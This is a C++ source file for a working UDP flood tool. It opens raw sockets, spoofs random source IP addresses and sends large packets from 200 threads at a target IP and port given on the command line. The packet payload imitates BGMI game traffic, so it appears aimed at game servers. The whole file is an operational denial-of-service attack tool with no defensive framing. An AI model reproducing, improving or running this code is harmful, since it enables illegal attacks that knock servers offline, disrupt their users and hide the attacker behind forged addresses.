#include <iostream>
#include <thread>
#include <vector>
#include <string>
#include <cstring>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <chrono>
#include <mutex>
#include <random>

#define PACKET_SIZE 8192
#define MAX_PACKETS_PER_SEC 200000
#define NUM_THREADS 200

struct PseudoHeader {
    uint32_t source_addr;
    uint32_t dest_addr;
    uint8_t placeholder;
    uint8_t protocol;
    uint16_t udp_length;
};

unsigned short checksum(void* b, int len) {
    unsigned short* buf = (unsigned short*)b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2) sum += *buf++;
    if (len == 1) sum += *(unsigned char*)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

class UdpFlooder {
private:
    std::string target_ip;
    int target_port;
    int duration;
    unsigned long packets_sent;
    std::mutex mtx;

    void flood_thread() {
        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (sock < 0) {
            std::cerr << "Raw socket creation failed: " << strerror(errno) << std::endl;
            return;
        }

        int one = 1;
        setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

        struct sockaddr_in target = {0};
        target.sin_family = AF_INET;
        target.sin_port = htons(target_port);
        inet_pton(AF_INET, target_ip.c_str(), &target.sin_addr);

        char packet[PACKET_SIZE + sizeof(struct iphdr) + sizeof(struct udphdr)];
        struct iphdr* iph = (struct iphdr*)packet;
        struct udphdr* udph = (struct udphdr*)(packet + sizeof(struct iphdr));
        char* data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);

        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + PACKET_SIZE);
        iph->frag_off = 0;
        iph->ttl = 255;
        iph->protocol = IPPROTO_UDP;
        iph->check = 0;

        udph->dest = target.sin_port;
        udph->len = htons(sizeof(struct udphdr) + PACKET_SIZE);
        udph->check = 0;

        const unsigned char header[] = {0xFF, 0xFF, 0xFF, 0xFF};
        snprintf(data, PACKET_SIZE, "%.*sBGMI:Player:%d:Ping:%d", 
                 4, (const char*)header, rand() % 1000, rand() % 1000);
        memset(data + strlen(data), 'X', PACKET_SIZE - strlen(data) - 1);
        data[PACKET_SIZE - 1] = '\0';

        auto start_time = std::chrono::steady_clock::now();
        while (true) {
            auto now = std::chrono::steady_clock::now();
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start_time).count();
            if (elapsed >= duration) break;

            for (int i = 0; i < MAX_PACKETS_PER_SEC / NUM_THREADS; ++i) {
                iph->id = htonl(rand() % 65535);
                iph->saddr = htonl(rand()); // Random source IP
                udph->source = htons(rand() % 65535);

                iph->check = 0;
                PseudoHeader psh = {iph->saddr, iph->daddr = target.sin_addr.s_addr, 0, IPPROTO_UDP, udph->len};
                char check_buf[sizeof(PseudoHeader) + sizeof(struct udphdr) + PACKET_SIZE];
                memcpy(check_buf, &psh, sizeof(psh));
                memcpy(check_buf + sizeof(psh), udph, sizeof(struct udphdr));
                memcpy(check_buf + sizeof(psh) + sizeof(struct udphdr), data, PACKET_SIZE);
                udph->check = checksum(check_buf, sizeof(check_buf));
                iph->check = checksum(iph, sizeof(struct iphdr));

                ssize_t sent = sendto(sock, packet, ntohs(iph->tot_len), 0,
                                     (struct sockaddr*)&target, sizeof(target));
                if (sent > 0) {
                    std::lock_guard<std::mutex> lock(mtx);
                    packets_sent++;
                }
            }
            std::this_thread::sleep_for(std::chrono::microseconds(1));
        }
        close(sock);
    }

public:
    UdpFlooder(const std::string& ip, int port, int dur) 
        : target_ip(ip), target_port(port), duration(dur), packets_sent(0) {}

    void start_flood() {
        std::vector<std::thread> threads;
        for (int i = 0; i < NUM_THREADS; ++i) {
            threads.emplace_back(&UdpFlooder::flood_thread, this);
        }

        auto start_time = std::chrono::steady_clock::now();
        while (true) {
            auto now = std::chrono::steady_clock::now();
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start_time).count();
            if (elapsed >= duration) break;
            {
                std::lock_guard<std::mutex> lock(mtx);
                std::cout << "\rPackets sent: " << packets_sent 
                          << " (" << packets_sent / (elapsed + 1.0) << " packets/sec, "
                          << packets_sent * PACKET_SIZE * 8 / (elapsed + 1.0) / 1000000 << " Mbps)";
                std::cout.flush();
            }
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }

        for (auto& t : threads) {
            t.join();
        }
        std::cout << "\nFlood completed. Total packets sent: " << packets_sent << std::endl;
    }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] << " <IP> <Port> <Time>" << std::endl;
        return 1;
    }

    std::string target_ip = argv[1];
    int target_port = std::stoi(argv[2]);
    int duration = std::stoi(argv[3]);

    if (target_port <= 0 || target_port > 65535) {
        std::cerr << "Port must be between 1 and 65535" << std::endl;
        return 1;
    }
    if (duration <= 0) {
        std::cerr << "Duration must be positive" << std::endl;
        return 1;
    }

    int ignore_ports[] = {8700, 20000, 443, 17500, 9031, 20002, 20001, 8080, 8086, 8011, 9030};
    for (int i = 0; i < sizeof(ignore_ports) / sizeof(ignore_ports[0]); ++i) {
        if (target_port == ignore_ports[i]) {
            std::cerr << "Error: Port " << target_port << " is in the ignore list" << std::endl;
            return 1;
        }
    }

    std::cout << "Starting raw UDP flood on " << target_ip << ":" << target_port 
              << " for " << duration << " seconds with " << NUM_THREADS << " threads" << std::endl;

    UdpFlooder flooder(target_ip, target_port, duration);
    flooder.start_flood();

    return 0;
}